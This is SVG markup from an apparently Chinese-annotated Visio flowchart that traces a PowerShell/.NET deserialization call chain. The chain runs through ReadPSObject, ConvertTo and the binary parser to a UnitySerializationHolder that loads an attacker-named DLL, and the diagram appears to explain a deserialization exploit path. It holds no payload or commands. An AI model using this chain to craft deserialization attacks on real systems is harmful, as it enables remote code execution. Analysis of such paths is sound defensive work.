&lt;v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey=""
v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;/v:custProps>
&lt;v:userDefs>
&lt;v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/>
&lt;v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/>
&lt;v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;/v:userDefs>
&lt;v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="82.5114" cy="1335.88" width="165.03" height="49.5068"/>
&lt;rect x="0" y="1311.12" width="165.023" height="49.5068" class="st2"/>
&lt;text x="33.36" y="1333.08" class="st3" v:langID="1033">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>ReadOneDeserializedObject&lt;v:newlineChar/>&lt;tspan
x="50.68" dy="1.275em" class="st4" v:langID="2052">遍历&lt;/tspan>&lt;tspan class="st5" v:langID="2052">XML&lt;/tspan>&lt;tspan
class="st4" v:langID="2052">树的标签&lt;/tspan>&lt;/text> &lt;/g>
&lt;g id="shape10-14" v:mID="10" v:groupContext="shape" v:layerMember="1" transform="translate(153.479,-1026.2)">
&lt;title>动态连接线&lt;/title>
&lt;desc>调用读取一个反序列化对象 object obj = this.ReadOneDeserializedObject&lt;/desc>
&lt;v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="7.35803" cy="1401.61" width="168.1" height="28.0064"/>
&lt;path d="M6.82 1360.63 L6.82 1381.89 L7.36 1381.89 L7.36 1437.1" class="st6"/>
&lt;rect v:rectContext="textBkgnd" x="-71.5903" y="1391.61" width="157.897" height="20.0025" class="st8"/>
&lt;text x="-44.64" y="1399.42" class="st9" v:langID="2052">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>调用，读取一个反序列化对象&lt;v:newlineChar/>&lt;tspan
x="-71.59" dy="1.225em" class="st10" v:langID="1033">object obj &lt;/tspan>&lt;tspan class="st10" v:langID="1033">= &lt;/tspan>&lt;tspan
class="st10" v:langID="1033">this&lt;/tspan>&lt;tspan class="st10" v:langID="1033">.&lt;/tspan>&lt;tspan class="st10"
v:langID="1033">ReadOneDeserializedObject&lt;/tspan>&lt;/text> &lt;/g>
&lt;g id="shape12-27" v:mID="12" v:groupContext="shape" v:layerMember="1" transform="translate(153.751,-894.183)">
&lt;title>动态连接线.12&lt;/title>
&lt;desc>碰到Obj标签调用读取一个Obj对象 if (this.IsNextElement(&amp;#34;Obj&amp;#34;)){ return thi...&lt;/desc>
&lt;v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="7.08661" cy="1391.57" width="147.54" height="37.6064"/>
&lt;path d="M7.09 1360.63 L7.09 1416.47" class="st6"/>
&lt;rect v:rectContext="textBkgnd" x="-61.5847" y="1376.77" width="137.343" height="29.6027" class="st8"/>
&lt;text x="-61.58" y="1384.57" class="st9" v:langID="2052">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>碰到&lt;tspan
class="st10">Obj&lt;/tspan>标签，调用，读取一个&lt;tspan class="st10">Obj&lt;/tspan>对象&lt;v:newlineChar/>&lt;tspan x="-44.17"
dy="1.225em" class="st10" v:langID="1033">if &lt;/tspan>&lt;tspan class="st10" v:langID="1033">(&lt;/tspan>&lt;tspan
class="st10" v:langID="1033">this&lt;/tspan>&lt;tspan class="st10" v:langID="1033">.&lt;/tspan>&lt;tspan class="st10"
v:langID="1033">IsNextElement&lt;/tspan>&lt;tspan class="st10" v:langID="1033">(&amp;#34;&lt;/tspan>&lt;tspan class="st10"
v:langID="1033">Obj&lt;/tspan>&lt;tspan class="st10" v:langID="1033">&amp;#34;))&lt;/tspan>&lt;tspan class="st10"
v:langID="1033">{&lt;v:newlineChar/>&lt;/tspan>&lt;tspan x="-41.28" dy="1.2em" class="st10" v:langID="1033">return this&lt;/tspan>&lt;tspan
class="st10" v:langID="1033">.&lt;/tspan>&lt;tspan class="st10" v:langID="1033">ReadPSObject&lt;/tspan>&lt;tspan
class="st10" v:langID="1033">()&lt;/tspan>&lt;tspan class="st10" v:langID="1033">;}&lt;/tspan>&lt;/text> &lt;/g>
&lt;g id="shape11-50" v:mID="11" v:groupContext="shape" v:layerMember="0" transform="translate(109.268,-770.416)">
&lt;title>流程.11&lt;/title>
&lt;desc>ReadPSObject 读取一个Obj对象&lt;/desc>
&lt;v:custProps>
&lt;v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey=""
v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;/v:custProps>
&lt;v:userDefs>
&lt;v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/>
&lt;v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/>
&lt;v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;/v:userDefs>
&lt;v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/>
&lt;rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/>
&lt;text x="26.7" y="1326.89" class="st3" v:langID="1033">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>ReadPSObject&lt;v:newlineChar/>&lt;tspan
x="21.23" dy="1.275em" class="st4" v:langID="2052">读取一个&lt;/tspan>&lt;tspan class="st5" v:langID="2052">Obj&lt;/tspan>&lt;tspan
class="st4" v:langID="2052">对象&lt;/tspan>&lt;/text> &lt;/g>
&lt;g id="shape14-56" v:mID="14" v:groupContext="shape" v:layerMember="1" transform="translate(155.542,-770.416)">
&lt;title>动态连接线.14&lt;/title>
&lt;desc>碰到Props标签调用读取Props标签 if (this.IsNextElement(&amp;#34;Props&amp;#34;)){ this.R...&lt;/desc>
&lt;v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="8.87798" cy="1402.16" width="146.29" height="37.6064"/>
&lt;path d="M5.3 1360.63 L5.3 1381.89 L8.88 1381.89 L8.88 1441.23" class="st6"/>
&lt;rect v:rectContext="textBkgnd" x="-59.1685" y="1387.36" width="136.093" height="29.6027" class="st8"/>
&lt;text x="-59.17" y="1395.16" class="st9" v:langID="2052">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>碰到&lt;tspan
class="st10">Props&lt;/tspan>标签，调用，读取&lt;tspan class="st10">Props&lt;/tspan>标签&lt;v:newlineChar/>&lt;tspan x="-46.06"
dy="1.225em" class="st10" v:langID="1033">if &lt;/tspan>&lt;tspan class="st10" v:langID="1033">(&lt;/tspan>&lt;tspan
class="st10" v:langID="1033">this&lt;/tspan>&lt;tspan class="st10" v:langID="1033">.&lt;/tspan>&lt;tspan class="st10"
v:langID="1033">IsNextElement&lt;/tspan>&lt;tspan class="st10" v:langID="1033">(&amp;#34;&lt;/tspan>&lt;tspan class="st10"
v:langID="1033">Props&lt;/tspan>&lt;tspan class="st10" v:langID="1033">&amp;#34;))&lt;/tspan>&lt;tspan class="st10"
v:langID="1033">{&lt;v:newlineChar/>&lt;/tspan>&lt;tspan x="-44.57" dy="1.2em" class="st10" v:langID="1033">this&lt;/tspan>&lt;tspan
class="st10" v:langID="1033">.&lt;/tspan>&lt;tspan class="st10" v:langID="1033">ReadProperties&lt;/tspan>&lt;tspan
class="st10" v:langID="1033">(&lt;/tspan>&lt;tspan class="st10" v:langID="1033">psobject&lt;/tspan>&lt;tspan
class="st10" v:langID="1033">)&lt;/tspan>&lt;tspan class="st10" v:langID="1033">;}&lt;/tspan>&lt;/text> &lt;/g>
&lt;g id="shape13-81" v:mID="13" v:groupContext="shape" v:layerMember="0" transform="translate(112.85,-621.896)">
&lt;title>流程.13&lt;/title>
&lt;desc>ReadProperties&lt;/desc>
&lt;v:custProps>
&lt;v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey=""
v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;/v:custProps>
&lt;v:userDefs>
&lt;v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/>
&lt;v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/>
&lt;v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;/v:userDefs>
&lt;v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/>
&lt;rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/>
&lt;text x="24.77" y="1332.09" class="st3" v:langID="1033">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>ReadProperties&lt;/text> &lt;/g>
&lt;g id="shape16-84" v:mID="16" v:groupContext="shape" v:layerMember="1" transform="translate(215.989,-652.838)">
&lt;title>动态连接线.16&lt;/title>
&lt;desc>调用读取嵌套对象&lt;/desc>
&lt;v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="157.092" cy="1170.55" width="82.2" height="28.0064"/>
&lt;path d="M0 1360.63 L33.36 1360.63 A3 3 0 0 1 39.36 1360.63 L89.19 1360.63 A3 3 0 0 1 95.19 1360.63 L155.67 1360.63 L155.67
953.07 L170.89 953.07" class="st6"/>
&lt;rect v:rectContext="textBkgnd" x="121.092" y="1160.55" width="71.9997" height="20.0025" class="st8"/>
&lt;text x="121.09" y="1168.35" class="st9" v:langID="2052">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>调用，读取嵌套对象&lt;v:newlineChar/>&lt;/text> &lt;/g>
&lt;g id="shape15-91" v:mID="15" v:groupContext="shape" v:layerMember="0" transform="translate(392.924,-1029.46)">
&lt;title>流程.15&lt;/title>
&lt;desc>ReadOneObject&lt;/desc>
&lt;v:custProps>
&lt;v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey=""
v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;/v:custProps>
&lt;v:userDefs>
&lt;v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/>
&lt;v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/>
&lt;v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;/v:userDefs>
&lt;v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/>
&lt;rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/>
&lt;text x="23.69" y="1332.09" class="st3" v:langID="1033">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>ReadOneObject&lt;/text> &lt;/g>
&lt;g id="shape20-94" v:mID="20" v:groupContext="shape" v:layerMember="1" transform="translate(441.932,-1029.46)">
&lt;title>动态连接线.20&lt;/title>
&lt;desc>调用将反序列化数据 转换为目标类型此时目标类型为System.Exception&lt;/desc>
&lt;v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="11.6116" cy="1400.52" width="191.4" height="38.4093"/>
&lt;path d="M2.56 1360.63 L2.56 1381.89 L11.61 1381.89 L11.61 1443.42" class="st6"/>
&lt;rect v:rectContext="textBkgnd" x="-78.9875" y="1385.32" width="181.198" height="30.4055" class="st8"/>
&lt;text x="-28.39" y="1393.12" class="st9" v:langID="2052">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>调用，将反序列化数据&lt;v:newlineChar/>&lt;tspan
x="-78.99" dy="1.3em" class="st5">转换为目标类型&lt;/tspan>，此时目标类型为&lt;tspan class="st10">System&lt;/tspan>&lt;tspan
class="st10">.&lt;/tspan>&lt;tspan class="st10">Exception&lt;/tspan>&lt;v:newlineChar/>&lt;/text> &lt;/g>
&lt;g id="shape19-105" v:mID="19" v:groupContext="shape" v:layerMember="0" transform="translate(401.974,-878.74)">
&lt;title>流程.19&lt;/title>
&lt;desc>ConvertTo&lt;/desc>
&lt;v:custProps>
&lt;v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey=""
v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;/v:custProps>
&lt;v:userDefs>
&lt;v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/>
&lt;v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/>
&lt;v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;/v:userDefs>
&lt;v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/>
&lt;rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/>
&lt;text x="33.29" y="1332.09" class="st3" v:langID="1033">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>ConvertTo&lt;/text> &lt;/g>
&lt;g id="shape22-108" v:mID="22" v:groupContext="shape" v:layerMember="1" transform="translate(505.113,-909.682)">
&lt;title>动态连接线.22&lt;/title>
&lt;desc>一系列调用&lt;/desc>
&lt;v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="119.807" cy="1360.63" width="50.2" height="18.4064"/>
&lt;path d="M0 1360.63 L151.98 1360.63 L151.98 1442.22" class="st6"/>
&lt;rect v:rectContext="textBkgnd" x="99.807" y="1355.43" width="39.9998" height="10.403" class="st8"/>
&lt;text x="99.81" y="1363.23" class="st9" v:langID="2052">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>一系列调用&lt;/text> &lt;/g>
&lt;g id="shape21-115" v:mID="21" v:groupContext="shape" v:layerMember="0" transform="translate(605.522,-760.164)">
&lt;title>流程.21&lt;/title>
&lt;desc>Object.Reader.Deserialize&lt;/desc>
&lt;v:custProps>
&lt;v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey=""
v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;/v:custProps>
&lt;v:userDefs>
&lt;v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/>
&lt;v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/>
&lt;v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;/v:userDefs>
&lt;v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/>
&lt;rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/>
&lt;text x="6.93" y="1332.09" class="st3" v:langID="2052">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>Object.Reader.&lt;tspan
class="st5" v:langID="1033">Deserialize&lt;/tspan>&lt;/text> &lt;/g>
&lt;g id="shape24-119" v:mID="24" v:groupContext="shape" v:layerMember="1" transform="translate(661.617,-760.164)">
&lt;title>动态连接线.24&lt;/title>
&lt;desc>调用解析内存中的序列化数据&lt;/desc>
&lt;v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="-9.64826" cy="1403.78" width="122.2" height="18.4064"/>
&lt;path d="M-4.52 1360.63 L-4.52 1381.89 L-9.65 1381.89 L-9.65 1446.02" class="st6"/>
&lt;rect v:rectContext="textBkgnd" x="-65.6479" y="1398.58" width="112" height="10.403" class="st8"/>
&lt;text x="-65.65" y="1406.38" class="st9" v:langID="2052">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>调用，解析内存中的序列化数据&lt;/text> &lt;/g>
&lt;g id="shape23-126" v:mID="23" v:groupContext="shape" v:layerMember="0" transform="translate(600.399,-606.854)">
&lt;title>流程.23&lt;/title>
&lt;desc>__BinaryParser.Run&lt;/desc>
&lt;v:custProps>
&lt;v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey=""
v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;/v:custProps>
&lt;v:userDefs>
&lt;v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/>
&lt;v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/>
&lt;v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;/v:userDefs>
&lt;v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/>
&lt;rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/>
&lt;text x="18.73" y="1332.09" class="st3" v:langID="1033">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>__BinaryParser&lt;tspan
class="st5" v:langID="2052">.&lt;/tspan>&lt;tspan class="st5" v:langID="2052">Run&lt;/tspan>&lt;/text> &lt;/g>
&lt;g id="shape28-131" v:mID="28" v:groupContext="shape" v:layerMember="1" transform="translate(647.444,-606.854)">
&lt;title>动态连接线.28&lt;/title>
&lt;path d="M4.52 1360.63 L4.52 1381.89 L9.65 1381.89 L9.65 1408.69" class="st6"/>
&lt;/g>
&lt;g id="shape27-136" v:mID="27" v:groupContext="shape" v:layerMember="0" transform="translate(605.522,-445.491)">
&lt;title>流程.27&lt;/title>
&lt;desc>将序列化数据解析为System.UnitySerializationHolder对象并载入m_assmblyName对应的...&lt;/desc>
&lt;v:custProps>
&lt;v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey=""
v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;/v:custProps>
&lt;v:userDefs>
&lt;v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/>
&lt;v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/>
&lt;v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.62992125984252):24"/>
&lt;/v:userDefs>
&lt;v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="51.5696" cy="1307" width="103.14" height="107.265"/>
&lt;rect x="0" y="1253.37" width="103.139" height="107.265" class="st2"/>
&lt;text x="15.57" y="1294.19" class="st11" v:langID="2052">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>将序列化数据解析为&lt;tspan
x="2.27" dy="1.2em" class="st10" v:langID="1033">System&lt;/tspan>&lt;tspan class="st10" v:langID="1033">.&lt;/tspan>&lt;tspan
class="st10" v:langID="1033">UnitySerializationHo&lt;/tspan>&lt;tspan x="20.76" dy="1.275em" class="st10"
v:langID="1033">lder&lt;/tspan>对象，并载入&lt;tspan x="3.2" dy="1.3em" class="st10">m&lt;/tspan>&lt;tspan class="st10">_&lt;/tspan>&lt;tspan
class="st10">assmblyName&lt;/tspan>对应的&lt;tspan class="st10">DLL&lt;/tspan>&lt;/text> &lt;/g>
&lt;g id="shape39-147" v:mID="39" v:groupContext="shape" v:layerMember="1" transform="translate(450.982,-878.74)">
&lt;title>动态连接线.39&lt;/title>
&lt;path d="M2.56 1360.63 L2.56 1381.89 L11.61 1381.89 L11.61 1427.98" class="st6"/>
&lt;/g>
&lt;g id="shape38-152" v:mID="38" v:groupContext="shape" v:layerMember="0" transform="translate(411.024,-722.835)">
&lt;title>流程.38&lt;/title>
&lt;desc>转化为在m_assmblyName对应的DLL中的m_data对应类型的Type对象&lt;/desc>
&lt;v:custProps>
&lt;v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
